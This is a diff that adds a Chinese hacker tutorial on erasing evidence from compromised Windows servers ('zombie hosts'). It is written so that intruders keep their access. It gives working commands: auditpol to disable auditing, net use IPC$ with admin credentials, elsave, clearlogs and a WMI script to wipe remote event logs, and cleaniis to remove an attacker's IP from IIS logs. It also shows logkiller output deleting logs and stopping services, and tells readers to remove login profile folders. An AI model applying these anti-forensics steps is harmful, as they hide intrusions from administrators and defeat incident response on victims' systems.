@@ -1,0 +1,172 @@
+中华网络安全联盟
+www.xren.net
+www.moyi.net
+www.ciwunion.com
+======================
+日志清除工具九合一+使用说明
+
+有很多朋友，后门安置的都很不错，可是没过几天，肉鸡就不能用了，帐户也没有了？？这是为什么，我想你没有清日志吧？？ 
+清日志我们俗称擦PP，呵呵！~~~~~~~~~~那么要想擦得干净，不光“手纸”要好，而且也要对要擦的是什么有所了解。我先跟大家说说都是哪些日志： 
+一。系统自带的日志。你可以如下操作：“开始-》设置—》控制面板-》管理工具-》事件查看器”。来打开系统自带的日志。分为： 
+1。应用程序日志：记录了重要的应用程序产生的错误和成功信息。 
+2。安全日志：主要记录着win2k操作系统的组件所产生的日志，比如IIS中自带的ftp日志等等。 
+3。系统日志：主要记录审核策略的日志。 
+说到审核策略，我也要来说说。这个是不容忽视的，先看一下相关概念： 
+建立审核的跟踪记录是安全性的重要内容。监视对象的创建和修改提供了追踪潜在安全性问题的方法，帮助确保用户帐户的可用性并在可能出现安全性破坏事件时提供证据。 对系统执行与安全性相关的审核有三个主要步骤。 
+首先，必须打开要审核的事件类别。用户登录注销和帐户管理就是事件类别的典型例子。选定的事件类别组成了审核策略。第一次安装 Windows 2000 时，没有选中任何类别，也就没有强制的审核策略。"计算机管理"列出了可以审核的事件类别。 
+其次，必须设置安全日志的大小和行为。 
+最后，如果您已经选择了审核目录服务访问类别或审核对象访问类别，则必须确定要监视访问的对象并相应地修改其安全描述符。例如，如果要审核用户为打开特定文件所做的尝试，可以针对特定事件在该文件上直接设置成功或失败属性。 
+
+那么对付审核策略我们这里有一个非常强大的工具auditpol.exe，这个是命令行下的审核策略配置实用程序。如图一。 
+有没有发现"审核策略"里的每个策略是不是和该命令行下的Category提供的很像啊？其实就是一模一样的啦。再结合Option参数的设置不就完全能够实现与本地设置策略的效果一样一样了吗！如图二。 
+下面，还是让我们来看看如何使用吧，很简单的。LOOK 当然先查看一下当前的"审核策略"是个什么样子的。上面是为了能够看出该工具的效果，我将所有的策略全部都关闭了。如果那台"肉鸡"的系统也是这个样子的话，那最好了。都省了过多的使用这个工具了。不过为了安全还是要检查一下的。 结果如图三。 
+可是往往系统管理员会或多或少的开启一些的了如图四。 
+这样，我们如果在对该系统肆意操作之前就得先将这些开启的审核全部关闭。目的我不用说大家也该明白。呵呵，接着操作吧。利用/disable参数来关闭全部。 
+输入auditpol.exe /disable 来关闭所有的审核。 
+当然为了做完该做的事后，还是要原封不动的还原咯。我是个追求完美主义者。可是有人会说刚才我记不得哪些是开启哪些是关闭的了，怎么办呢？没关系的这样才完美嘛：如图五。 
+
+另外上面演示的是在本地，如果要远程呢？？呵呵我们来看看： 
+F:>net use \\192.168.0.77\ipc$ password /u:administrator 
+命令成功完成。 
+F:\>auditpol.exe \\192.168.0.77 /enable /system:all /logon:all /account:success 
+Running ... 
+Audit information changed successfully on \\192.168.0.77 ... 
+New audit policy on \\192.168.0.77 ... 
+System = Success and Failure 
+Logon = Success and Failure 
+Object Access = No Privilege 
+Use = No Process 
+Tracking = No 
+Policy Change = No 
+Account Management = No 
+Directory Service Access = No 
+Account Logon = Success 
+如果要关闭把上面的enable改成disable就可以了！~~~~~~~~ 
+审核策略就说到这里，还想继续了解的可以去参考有关书籍。接着上面说，知道了那3个系统自带的日志后，我们来看看怎么清除。首先看看基于ipc的远程删除日志的工具：一个是elsave，这个大家都很了解了吧，如下： 
+F:\tools\rizhi>elsave 
+elsave: You must use -F and/or -C 
+
+F:\tools\rizhi>elsave /? 
+usage: elsave [-s \\server] [-l log] [-F file] [-C] [-q] 
+Saves and/or clears a Windows NT event log. Version 0.4 19980907. 
+-s \\server  Server for which you want to save or clear the log. 
+-l log       Name of log to save or clear. 
+-F file      Save the log to a file with this name. Must be absolute path to 
+            local file on the server for which you want to save the log. 
+-C           Clear the log. 
+-q           Write errors to the event log 
+那么我要删除远程机器的应用程序日志命令格式如下： 
+elsave -s \\192.168.0.77  -l "application" -C 
+同样的要删除安全日志和系统日志，就在-l参数后跟上“security”和“system”来。 
+另外一个工具是clearlog使用说明如下： 
+F:\tools\rizhi>clearlog
+
+ClearLogs 1.0 - (c) 2002, Arne Vidstrom (arne.vidstrom@ntsecurity.nu) 
+             - http://ntsecurity.nu/toolbox/clearlogs/ 
+
+Usage: clearlogs [\\computername] <-app / -sec / -sys> 
+
+       -app = application log 
+       -sec = security log 
+       -sys = system log 
+
+比elsave简单多了是不是啊，呵呵！~~~~~我在此就不再赘述。这两个工具都需要你建立ipc连接来完成，那么如果没有ipc怎么办啊。那就是基于wmi（windows 管理规范）来清除了。 
+如下： 
+F:\tools\rizhi>cscript dellog.vbs 
+Microsoft (R) Windows 脚本宿主版本 5.1 for Windows 
+版权所有(C) Microsoft Corporation 1996-1999. All rights reserved. 
+
+******************************************************************************* 
+RCLS v1.06 
+Remote Clear eventLogs Script, by zzzEVAzzz 
+Welcome to visite www.isgrey.com 
+Usage: 
+cscript F:\tools\rizhi\dellog.vbs targetIP username password [lognamelist] 
+lognamelist: 
+  logname1[,logname2...]    clear specified logs 
+  *|-a|-all                 clear all logs 
+  -v|-view|NULL             enum log names 
+******************************************************************************* 
+
+可以删除指定的日志，也可以全部删除，是不是很容易啊。呵呵！~~~~~~~~~~~~~~ 
+
+好了系统自带的日志我就介绍到这里。下面我们来看看，IIS日志。 
+二。IIS日志。IIS日志保存在%systemroot%\system32\logfiles\下。如果启动了web server的话，那么就会在上述路径下多出一个W3SVC1的文件夹，用来存储web服务日志。 
+如果也启动了iis 自带的ftp服务，那么还有会有个MSFTPSVC1的文件夹，里面是ftp的日志。 
+让我们来看看本地清除，要用到的工具是cleaniis.exe如下： 
+F:\tools\rizhi>cleaniis 
+iisantidote <logfile dir> <ip or string to hide> 
+iisantidote <logfile dir><ip or string to hide> stop 
+stop opiton will stop iis before clearing the files and restart it after 
+<logfile dir> exemple : c:\winnt\system32\logfiles\w3svc1\ dont forget the \ 
+
+什么意思呢？？我来给大家举个例子吧： 
+cleaniis c:\winnt\system32\logfiles\w3svc1\ 10.24.9.100 
+
+//清除log中所有此IP地址的访问记录. 
+
+cleaniis c:\winnt\system32\logfiles\w3svc1\ /shop/admin/ 
+
+//清除log中所有对此目录的访问记录. 
+
+cleaniis c:\winnt\system32\logfiles\w3svc1\ 10.24.9.100 stop 
+
+//使用stop参数进行日志清除. 
+
+IIS日志我还没找到过远程删除的，上面我提到的那个dellog.vbs好象是可以，大家可以测试一下。 
+
+三。终端服务的日志。3. 清空终端服务的日志只有在图形界面控制下去完成了。这是因为终端服务的开启日志的配置的特殊性所造成的。我们还是来讨论讨论吧。首先要知道如果存在终端服务，如果管理员开启了日志，设置该日志记录的位置会在什么地方。如下图，先打开"终端服务配置"，找到"连接"里的RDP-tcp。并右击其"属性"图6。 
+点击"环境"选项卡，看看管理员是否运行了什么用来作日志记录的程序。（记得shotgun写过相关的BAT文件，大家有兴趣的话，可以在网上查找一下，一定有的。）这是一个会作日志记录的地方。图7。 
+
+接下来就是"权限"选项卡里的"高级"选项了。点击进去看一看吧！图8。 
+点击进去后，如图9所示。在"审核"选项卡里可以确认是否对某些组，某些帐号配置了审核。不过大家放心这个审核是记录在事件查看器里的。上面我们已介绍过如何清除了。 
+好了，据我所知终端服务的日志记录就是在这两个地方配置的。若有遗漏还请大家多多指教啊！谢谢。 
+提醒大家注意，如果你是通过GUI或终端服务连接对方服务器的话，一定要记住将Documents and Settings里对应登录的帐号文件夹给删了。可别忘了啊…。 
+RMDIR [/S] [/Q] [驱动器:]路径 
+RD [/S] [/Q] [驱动器:]路径 
+
+/S 除目录本身外，还将删除指定目录下的所有子目录和 文件。用于删除目录树。 
+/Q 安静模式，加 /S 时，删除目录树结构不再要求确认 
+
+好累啊！~~~~~~~~~~~~~~~~~~~~~555，好了怎么利用工具清除日志我都给大家介绍的很清楚了。至于任何手工清除日志我这里就不再多少了，找到日志的存放的目录用命令行下的删除命令来删除（如上我已经介绍了rmdir等命令的参数），如果碰到删除不了的很有可能是正在使用，可以给他改一下名字，再删除。 
+如果大家使用了计划任务那么你还要删除计划任务的日志工具运用如下： 
+F:\tools\rizhi>logkiller 
+Log Killer V1.0 By WinEggDrop 
+
+Cleaning Event Logs...... 
+Clean Application Event Log Successfully 
+Clean Security Event Log Successfully 
+Clean System Event Log Successfully 
+----------------------------------------------------------------------------- 
+Backing Up Services Status...... Done 
+
+----------------------------------------------------------------------------- 
+Stopping Services...... 
+The Service "MSFTPSVC" Doesn't Exist 
+Stopping The Service "SMTPSVC"...... 
+Stopping The Service "W3SVC"...... 
+Stopping The Service "SCHEDULE"...... 
+----------------------------------------------------------------------------- 
+
+Deleting All Log Files...... 
+Delete C:\WINNT\System32\LogFiles\W3SVC1\ex000811.log Successfully 
+Remove Directory C:\WINNT\System32\LogFiles\W3SVC1 Succesfully 
+Remove Directory C:\WINNT\System32\LogFiles Succesfully 
+----------------------------------------------------------------------------- 
+
+Deleting Schedule Event Log File...... 
+Delete C:\WINNT\SchedLgU.txt Successfully 
+----------------------------------------------------------------------------- 
+
+Restoring Services Status...... 
+Starting Service "SMTPSVC" 
+Starting Service "W3SVC" 
+Starting Service "SCHEDULE" 
+----------------------------------------------------------------------------- 
+
+Mission Accomplished 
+
+看到了吗？？这个工具非常的全面，在命令行下直接输入logkiller就可以了，以删除的日志如下 
+1.删除"应用程序日志","安全日志"和"系统日志" 
+2.删除IIS,系统本身FTP服务，系统本身SMTP服务日志 
+3.删除计划任务日志 
